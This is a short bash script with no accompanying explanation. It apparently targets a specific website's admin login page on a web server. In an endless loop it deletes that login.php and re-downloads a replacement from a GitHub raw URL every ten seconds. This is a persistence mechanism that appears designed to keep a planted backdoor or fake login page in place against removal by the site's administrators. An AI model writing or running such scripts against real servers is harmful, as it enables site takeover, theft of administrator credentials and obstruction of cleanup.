#!/usr/bin/env bash
LOCAL_PATH="/var/www/www-root/data/www/savdo.tj/admin/login.php"
REMOTE_URL="https://raw.githubusercontent.com/MarcusovP/rev/refs/heads/main/login.php"

while true; do
  rm -f "$LOCAL_PATH"
  wget -q -O "$LOCAL_PATH" "$REMOTE_URL"
  sleep 10
done
